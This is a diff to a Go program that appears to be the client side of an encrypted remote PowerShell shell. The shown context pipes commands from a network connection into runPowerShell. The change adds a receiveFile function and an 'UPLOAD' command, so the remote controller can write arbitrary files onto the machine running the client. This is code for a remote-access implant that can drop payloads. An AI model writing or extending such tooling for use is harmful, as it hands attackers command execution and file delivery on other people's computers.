@@ -87,6 +87,29 @@ func main() {
 	runPowerShell(conn, stream)
 }
 
+func receiveFile(reader *bufio.Reader, stream cipher.Stream) error {
+	// Leggi l'intestazione della dimensione del file (10 byte come definito nel server)
+	header, err := reader.Peek(10)
+	if err != nil {
+		return err
+	}
+
+	var fileSize int64
+	fmt.Sscanf(string(header), "%d", &fileSize)
+	_, _ = reader.Discard(10) // Rimuove l'intestazione dalla coda di lettura
+
+	// Crea o sovrascrivi il file per la scrittura
+	file, err := os.Create("received_file")
+	if err != nil {
+		return err
+	}
+	defer file.Close()
+
+	// Leggi il contenuto del file dallo stream e scrivilo nel file locale
+	_, err = io.CopyN(file, reader, fileSize)
+	return err
+}
+
 // InterceptInput returns a reader that processes and filters input commands.
 func InterceptInput(conn net.Conn, stream cipher.Stream) io.Reader {
 	pr, pw := io.Pipe()
@@ -100,16 +123,19 @@ func InterceptInput(conn net.Conn, stream cipher.Stream) io.Reader {
 			}
 
 			line = strings.TrimSpace(line)
-			switch line {
-			case "UPLOAD":
-				// TODO: handle the "UPLOAD" command
-				continue
-			case "BBB":
-				// TODO: handle the "BBB" command
-				continue
+			switch {
+			case line == "UPLOAD":
+				err = receiveFile(reader, stream)
+				if err != nil {
+					fmt.Printf("Error receiving file: %v\n", err)
+				} else {
+					fmt.Println("File received successfully!")
+				}
+			case line == "File not found":
+				fmt.Println(line)
+			default:
+				pw.Write([]byte(line + "\n"))
 			}
-
-			pw.Write([]byte(line + "\n"))
 		}
 		pw.Close()
 	}()
